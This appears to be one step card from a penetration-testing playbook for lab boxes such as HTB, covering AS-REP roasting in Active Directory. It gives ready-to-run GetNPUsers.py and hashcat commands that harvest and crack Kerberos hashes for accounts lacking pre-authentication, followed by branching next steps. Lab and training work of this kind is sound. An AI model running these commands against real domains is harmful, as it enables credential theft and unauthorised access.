# AD - AS-REP Roasting

**Step 38 of 50 · AD**

*Request Kerberos responses for candidate users and crack any response from an account without pre-authentication.*

## Run this

```bash
GetNPUsers.py $Domain/ -dc-ip $BoxIP -usersfile $BoxDir/loot/users.txt -no-pass -request -format hashcat -outputfile $BoxDir/loot/asrep.txt
sed -n '1p' $BoxDir/loot/asrep.txt
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

## Example output

```

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

(No output for the roastable account, check the output file)

```
$ cat loot/asrep.txt
$krb5asrep$23$username@HTB.LOCAL:a3f1...HASH...c2d9
```
## What did you get?

- [ ] An AS-REP response was written → **Crack it and go to Step 40 · [[AD - Credential Validation]]**
- [ ] The output file is empty → **Check the username format, then go to Step 39 · [[AD - Kerberoasting]]**
- [ ] Hashcat recovered a password → **Set `$Username` and `$Password`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] Kerberos reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**

## Gotcha

> [!warning] 💡
> GetNPUsers can succeed without a clear success line. Always inspect `$BoxDir/loot/asrep.txt`.
